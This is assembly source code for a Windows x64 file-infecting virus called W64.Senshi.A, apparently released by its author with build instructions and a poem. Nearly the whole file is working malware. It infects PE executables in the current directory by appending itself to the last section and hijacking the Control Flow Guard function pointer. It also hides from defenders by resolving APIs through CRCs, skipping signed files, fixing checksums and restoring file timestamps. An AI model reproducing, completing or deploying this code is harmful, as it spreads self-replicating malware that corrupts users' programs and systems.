;W64.Senshi.A by hh86
;
;some of its features:
;- parasitic direct action infector of PE exe (but not looking at suffix)
;- infects files in current directory
;- new EPO for AMD64 files:
;       hooks the Control Flow Guard function
;- last section appender
;- uses CRCs instead of API names
;- uses VEH for common code exit
;- supports ASLR/DEP enabled files
;- no infect files with data outside of image (eg infected files, self-extractors)
;- correct file checksum without using imagehlp.dll :) 100% correct algorithm by rgb
;- plus some new code optimisations that were never seen before BeautifulSky
;----
;
;to build this thing:
;yasm
;----
;yasm -f win64 -o senshi.obj senshi.asm
;link senshi.obj /defaultlib:kernel32.lib /defaultlib:user32.lib /entry:main /section:.text,erw /subsystem:console /largeaddressaware:no /fixed
;---
;
;Young eagle, rise in the air!
;  You stared at the sun!
;My light and delicate gaze can't compare
;
;I stood, more tender than those
;  Who've witnessed you disappear...
;I'm kissing you now - across
;  The gap of a thousand years.
;Marina Tsvetaeva (1916)

bits 64

extern MessageBoxA:proc
extern ExitProcess:proc

%include "senshi.inc"

global main
section .text
main:
        mov     rsi, do_message
        sub     rsi, qword [rcx + 10h]       ;rcx = gs:[60h] at start time
        mov     edx, ntdcrcstk_size >> 3
        mov     rbx, ntdnames
        mov     rdi, ntdcrcbegin
        call    create_crcs
        mov     edx, krncrcstk_size >> 3
        mov     rbx, krnnames
        mov     rdi, krncrcbegin
        call    create_crcs
        mov     dword [RIP + host_patch - $ - 0ah], esi
                                             ;save rva only
        jmp     senshi_begin

do_message:
        push    rax
        xor     r9, r9
        mov     r8, txttitle
        mov     rdx, txtbody 
        xor     ecx, ecx
        call    MessageBoxA
        xor     ecx, ecx
        call    ExitProcess
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

senshi_begin:
        push    'hh86'                       ;replaced dynamically

host_patch:
        push    rdi
        push    rsi
        push    rbp
        push    rdx
        push    rcx
        push    rbx
        push    r9
        push    r8

patch_maskjmp:
        db      90h                          ;replaced to mask the JMP:
        jmp     senshi_init                  ;runs only once per process instance

senshi_ret:
        mov     byte [REL + patch_maskjmp], 81h
        pop     r8
        pop     r9
        pop     rbx
        pop     rcx
        pop     rdx
        pop     rbp
        pop     rsi
        pop     rdi
        ret

;-----------------------------------------------------------------------------
;recover ntdll and kernel32 image base
;-----------------------------------------------------------------------------

senshi_init:
        push    tebProcessEnvironmentBlock
        pop     rsi
        gs lodsq
        mov     rdx, qword [rax + pebImagebase]
        add     qword [rsp + 40h], rdx
        mov     rax, qword [rax + pebLdr]
        mov     rsi, qword [rax + InMemoryOrderModuleList]
        lodsq
        push    qword [rax + mDllBase]       ;ntdll
        xchg    rax, rsi
        lodsq
        push    qword [rax + mDllBase]       ;kernel32
        call    parse_exps

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin:
        times   krncrcstk_size >> 3 dd 0
krncrcend:
        db      0
;       db      "Senshi - hh86"              ;missing in action

        push    qword [rsp + krncrcstk_size]
        call    parse_exps

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

ntdcrcbegin:
        times   ntdcrcstk_size >> 3 dd 0
ntdcrcend:
        db      0

;-----------------------------------------------------------------------------
;enter buffer with align bits for the stack pointer
;keep the shadow space slots to use them later with FindNextFileW()
;-----------------------------------------------------------------------------

        enter   WIN32_FIND_DATA_size + 8, 0
        push    rsp
        pop     rdi
        push    "*"
        push    rsp
        pop     rcx
        push    rdi
        pop     rdx
        sub     rsp, 20h
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kFindFirstFileW]
        push    rax
        pop     rsi

;-----------------------------------------------------------------------------
;current directory only
;-----------------------------------------------------------------------------

test_dir:
        test    byte [rdi + WIN32_FIND_DATA.dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
        jne     find_next
        push    FILE_ATTRIBUTE_ARCHIVE
        pop     rdx

        ;and one July day in 1786, the Raven God appeared

        call    set_fileattr
        call    open_file

find_next:
        push    rsi
        pop     rcx
        push    rdi
        pop     rdx
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kFindNextFileW]
        dec     eax
        je      test_dir
        push    rsi
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kFindClose]
        lea     rsp, qword [rbp + 10h + ntdcrcstk_size + krncrcstk_size]
                                             ;restore stack pointer
        jmp     senshi_ret                   ;game over

;-----------------------------------------------------------------------------
;open file for mapping
;-----------------------------------------------------------------------------

open_file:
        cdq
        push    rdx
        push    rdx
        push    OPEN_EXISTING                ;but also GENERIC_READ | GENERIC_WRITE
        pop     rdx
        push    rdx
        sub     rsp, 20h
        xor     r9, r9
        xor     r8, r8
        lea     rcx, qword [rdi + WIN32_FIND_DATA.cFileName]
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kCreateFileW]
        xchg    rbx, rax
        call    map_view
        xor     r9, r9                       ;FILE_BEGIN
        xor     r8, r8
        mov     edx, dword [rdi + WIN32_FIND_DATA.dwFileSizeLow]
        push    rbx
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kSetFilePointer]
        push    rbx
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kSetEndOfFile]
        lea     r9, qword [rdi + WIN32_FIND_DATA.ftLastWriteTime]
        lea     r8, qword [rdi + WIN32_FIND_DATA.ftLastAccessTime]
        xor     edx, edx
        push    rbx
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kSetFileTime]
        push    rbx
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kCloseHandle]
        add     rsp, 38h

;-----------------------------------------------------------------------------
;restore/set file attributes
;-----------------------------------------------------------------------------

        mov     edx, dword [rdi + WIN32_FIND_DATA.dwFileAttributes]

set_fileattr:                                ;edx = file attributes, edi -> find data, esi -> platform APIs
        lea     rcx, dword [rdi + WIN32_FIND_DATA.cFileName]
        sub     rsp, 28h
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kSetFileAttributesW]
        add     rsp, 28h
        ret
        db      "22/03/18"

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86-64, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_file:
        cmp     word [rsi], 'MZ'
        jne     test_ret
        mov     eax, dword [rsi + mzhdr.mzlfanew]
        lea     rax, qword [rsi + rax + pehdr.peheapsize]
        cmp     dword [rax + pehdr.pesig - pehdr.peheapsize], 'PE'
        jne     test_ret
        cmp     word [rax + pehdr.pecoff + coffhdr.pemachine - pehdr.peheapsize], IMAGE_FILE_MACHINE_AMD64
        jne     test_ret

;-----------------------------------------------------------------------------
;don't infect dll files
;-----------------------------------------------------------------------------

        movzx   ebp, word [rax + pehdr.pecoff + coffhdr.peopthdrsize - pehdr.peheapsize]
        cmp     bp, pehdr.pedelay - pehdr.pemagic
        jb      test_ret
        mov     ecx, dword [rax + pehdr.pecoff + coffhdr.peflags - pehdr.peheapsize]
        test    cl, IMAGE_FILE_EXECUTABLE_IMAGE
        je      test_ret
        test    ch, (IMAGE_FILE_DLL | IMAGE_FILE_SYSTEM) >> 12
        jne     test_ret

;-----------------------------------------------------------------------------
;allow console interface, maybe one day we can put a nice message there ;)
;ignore any other type except GUI
;-----------------------------------------------------------------------------

        cmp     word [rax + pehdr.pemagic - pehdr.peheapsize], IMAGE_NT_OPTIONAL_HDR64_MAGIC
        jne     test_ret
        mov     ecx, dword [rax + pehdr.pesubsys - pehdr.peheapsize]
        dec     ecx
        dec     ecx
        cmp     cx, IMAGE_SUBSYSTEM_WINDOWS_GUI - 1
        jnbe    test_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword [rax + pehdr.pesecurity - pehdr.peheapsize], 0
        jne     test_ret

;-----------------------------------------------------------------------------
;don't infect files with data outside the image (eg infected files, self-extractors, etc)
;-----------------------------------------------------------------------------

        push    rsi
        lea     rsi, qword [rax + rbp + pehdr.pemagic - pehdr.peheapsize]
        imul    bp, word [rax + pehdr.pecoff + coffhdr.pesectcount - pehdr.peheapsize], pesect_size
        lea     rsi, qword [rsi + rbp - pesect_size]
        mov     ebx, dword [rsi + pesect.sectrawaddr]
        add     ebx, dword [rsi + pesect.sectrawsize]
        add     rdi, WIN32_FIND_DATA.dwFileSizeLow
        cmp     dword [rdi], ebx
        jne     test_ret                     ;file contains appended data

;-----------------------------------------------------------------------------
;don't infect files with virtual size larger than raw size: it may be a buffer
;of some kind and the code may get overwritten at some point
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        mov     ecx, dword [rsi + pesect.sectvirtsize]
        cmp     dword [rsi + pesect.sectrawsize], ecx
        jb      test_ret                     ;last section may have a buffer
        pop     rbx
        mov     ecx, dword [rax + pehdr.peconfig + pedir.dirrva - pehdr.peheapsize]
        jecxz   test_ret
        call    rva2raw
        cmp     dword [rcx], 70h
        jbe     test_ret
        push    rcx
        mov     rcx, qword [rcx + 70h]       ;get CFG check function pointer location
        jrcxz   test_ret
        sub     rcx, qword [rax + pehdr.peimagebase - pehdr.peheapsize]
        call    rva2raw                      ;it is VA not RVA
        pop     rbx
        ret

test_ret:
        int     3

;-----------------------------------------------------------------------------
;always create file mapping with added size for appending
;we can reset it later to its original size if no infection occurred (e.g not suitable
;for infection), so we don't map it twice
;-----------------------------------------------------------------------------

map_view:
        mov     ecx, dword [rdi + WIN32_FIND_DATA.dwFileSizeLow]
        add     ecx, (senshi_end - senshi_begin) + 1

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

        push    rsi
        xor     edx, edx
        push    rdx
        push    rcx
        sub     rsp, 20h
        xor     r9, r9
        lea     r8, qword [rdx + PAGE_READWRITE]
        push    rbx
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kCreateFileMappingW]
        xchg    rsi, rax
        push    0
        sub     rsp, 20h
        xor     r9, r9
        xor     r8, r8
        push    FILE_MAP_WRITE
        pop     rdx
        push    rsi
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kMapViewOfFile]
        xchg    rsi, rax
        xchg    rcx, rax
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kCloseHandle]
        call    infect_file
        call    unmap_veh
        push    rdx
        pop     rsp
        pop     rbx
        pop     rbp
        pop     rsi
        pop     rdi
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk.kRtlRemoveVectoredExceptionHandler]
        push    rsi
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk_size + krncrcstk.kUnmapViewOfFile]
        add     rsp, 58h
        pop     rsi
        ret

unmap_veh:
        mov     rcx, qword [rcx + EXCEPTION_POINTERS.ContextRecord]
        pop     qword [rcx + CONTEXT_RIP]
        or      eax, EXCEPTION_CONTINUE_EXECUTION
        ret

;-----------------------------------------------------------------------------
;infect file
;algorithm:     append last section and insert virus code there, image size is
;               increased. file size only increases by the size of the virus code
;               and a single byte for the infection marker
;               the code supports ASLR/DEP enabled files, so no need to alter
;               dll flags (clear NO_SEH and SafeSEH is only for 32-bit PE)
;               CFG check function pointer is altered.  very simple
;-----------------------------------------------------------------------------

infect_file:
        pop     rdx
        push    rsp
        pop     rcx
        call    qword [rbp + 8 + ntdcrcstk.kRtlAddVectoredExceptionHandler]
        push    rax
        push    rdi
        push    rsi
        push    rbp
        push    rbx
        push    rsp
        pop     rdx                          ;do not use this register anymore
        push    rsi
        call    test_file
        pop     rbp
        push    rdi
        push    rbx
        push    rcx
        push    rbp
        mov     ebp, dword [rsi + pesect.sectrawsize]
        mov     ecx, senshi_end - senshi_begin
        add     dword [rsi + pesect.sectrawsize], ecx
        stc                                  ;set carry flag
        adc     dword [rdi], ecx             ;carry flag is infection marker
        add     dword [rsi + pesect.sectvirtsize], ecx
        mov     edi, dword [rsi + pesect.sectvirtsize]
        mov     ebx, dword [rax + pehdr.pesectalign - pehdr.peheapsize]
        dec     ebx
        add     edi, ebx
        not     ebx
        and     edi, ebx                     ;section align virtual size
        add     edi, dword [rsi + pesect.sectvirtaddr]
        mov     dword [rax + pehdr.peimagesize - pehdr.peheapsize], edi   

;-----------------------------------------------------------------------------
;section attributes are always altered to executable because AMD64 will require it
;always altered to writable because we need to patch out entry point code
;the write bit could be set at runtime but we lost anti-heuristic already
;-----------------------------------------------------------------------------

        or      byte [rsi + pesect.sectflags + 3], (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE) >> 18h

;-----------------------------------------------------------------------------
;copy code to last section
;-----------------------------------------------------------------------------

        pop     rbx
        mov     edi, dword [rsi + pesect.sectrawaddr]
        add     edi, ebp
        add     rdi, rbx
        add     ebp, dword [rsi + pesect.sectvirtaddr]
        lea     rsi, qword [REL + senshi_begin]
                                            ;REL not RIP
        push    rdi
        rep     movsb
        pop     rdi

;-----------------------------------------------------------------------------
;replace function pointer
;-----------------------------------------------------------------------------

        pop     rsi
        add     rbp, qword [rax + pehdr.peimagebase - pehdr.peheapsize]
        xchg    qword [rsi], rbp
        sub     rbp, qword [rax + pehdr.peimagebase - pehdr.peheapsize]
        mov     dword [rdi + 1], ebp         ;save original as rva
        pop     rdi
        add     rdi, 70h
        xchg    rax, rcx
        stosq
        stosq
        stosq
        stosq
        stosd
        xchg    rax, rcx
        and     byte [rax + (pehdr.pedllflags + 1) - pehdr.peheapsize], (~IMAGE_DLLCHARACTERISTICS_GUARD_CF) >> 8

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword [rax + pehdr.pechksum - pehdr.peheapsize], ecx
        jecxz   infect_ret
        pop     rdi
        mov     ecx, dword [rdi]
        mov     edi, ecx
        xor     esi, esi
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum:
        adc     si, word [rbx]
        inc     ebx
        inc     ebx
        loop    calc_checksum
        adc     esi, edi
        mov     dword [rax + pehdr.pechksum - pehdr.peheapsize], esi
                                             ;avoid common bug.  ADC not ADD
infect_ret:
        int     3                            ;common exit using SEH

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rvaloop:
        sub     rsi, pesect_size
        db      3ch                          ;mask PUSH ESI

rva2raw:                                     ;ecx = RVA, esi -> last section header
        push    rsi
        cmp     dword [rsi + pesect.sectvirtaddr], ecx
        jnbe    rvaloop
        sub     ecx, dword [rsi + pesect.sectvirtaddr]
        add     ecx, dword [rsi + pesect.sectrawaddr]
        add     rcx, rbx
        pop     rsi
        ret

;-----------------------------------------------------------------------------
;parse export table 
;-----------------------------------------------------------------------------

parse_exps:
        pop     rsi
        pop     rbp
        mov     eax, dword [rbp + mzhdr.mzlfanew]
        mov     ebx, dword [rbp + rax + pehdr.peexport]
        add     rbx, rbp
        cdq

walk_names:
        inc     edx
        mov     eax, dword [rbx + peexp.expnamerva]
        add     rax, rbp
        mov     edi, dword [rax + rdx * 4]
        add     rdi, rbp
        or      eax, -1

crc_outer:
        xor     al, byte [rdi]
        push    8
        pop     rcx

crc_inner:
        shr     eax, 1
        jnc     crc_skip
        xor     eax, 0edb88320h

crc_skip:
        loop    crc_inner
        inc     rdi
        cmp     byte [rdi], cl
        jne     crc_outer
        not     eax
        cmp     dword [rsi], eax
        jne     walk_names

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        mov     edi, dword [rbx + peexp.expordrva]
        add     rdi, rbp
        movzx   edi, word [rdi + rdx * 2]
        mov     eax, dword [rbx + peexp.expadrrva]
        add     rax, rbp
        mov     eax, dword [rax + rdi * 4]
        add     rax, rbp
        push    rax
        lodsd
        sub     cl, byte [rsi]
        jne     walk_names
        inc     rsi
        jmp     rsi

senshi_end:

create_crcs:
        or      eax, -1

create_outer:
        xor     al, byte [rbx]
        push    8
        pop     rcx

create_inner:
        shr     eax, 1
        jnc     create_skip
        xor     eax, 0edb88320h

create_skip:
        loop    create_inner
        inc     ebx
        cmp     byte [rbx], cl
        jne     create_outer
        not     eax
        stosd
        inc     rbx
        dec     edx
        jne     create_crcs
        ret


ntdnames        db      "RtlAddVectoredExceptionHandler"   , 0
                db      "RtlRemoveVectoredExceptionHandler", 0

krnnames        db      "CloseHandle"       , 0
                db      "CreateFileMappingW", 0
                db      "CreateFileW"       , 0
                db      "FindClose"         , 0
                db      "FindFirstFileW"    , 0
                db      "FindNextFileW"     , 0
                db      "MapViewOfFile"     , 0
                db      "SetEndOfFile"      , 0
                db      "SetFileAttributesW", 0
                db      "SetFilePointer"    , 0
                db      "SetFileTime"       , 0
                db      "UnmapViewOfFile"   , 0

txttitle        db      "senshi", 0
txtbody         db      "done...", 0